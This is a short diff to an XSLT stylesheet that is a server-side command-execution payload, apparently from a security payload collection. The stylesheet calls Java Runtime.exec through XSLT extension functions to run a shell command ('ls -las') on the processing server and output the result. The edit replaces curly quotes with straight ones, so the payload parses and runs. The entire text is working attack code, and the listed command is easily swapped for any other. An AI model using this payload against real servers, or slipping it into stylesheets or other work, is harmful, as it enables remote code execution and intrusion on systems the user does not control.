@@ -7,7 +7,7 @@
     extension-element-prefixes="exsl" xsl:version="1.0"> 
 <body style="font-family:Arial;font-size:9pt;background-color:#AABBCC">
 <xsl:variable name="rtobject" select="runtime:getRuntime()"/> 
-<xsl:variable name="process" select="runtime:exec($rtobject,’ls -las’)"/> 
+<xsl:variable name="process" select="runtime:exec($rtobject,'ls -las')"/> 
 <xsl:variable name="waiting" select="process:waitFor($process)"/> 
 <xsl:value-of select="$process"/>
     
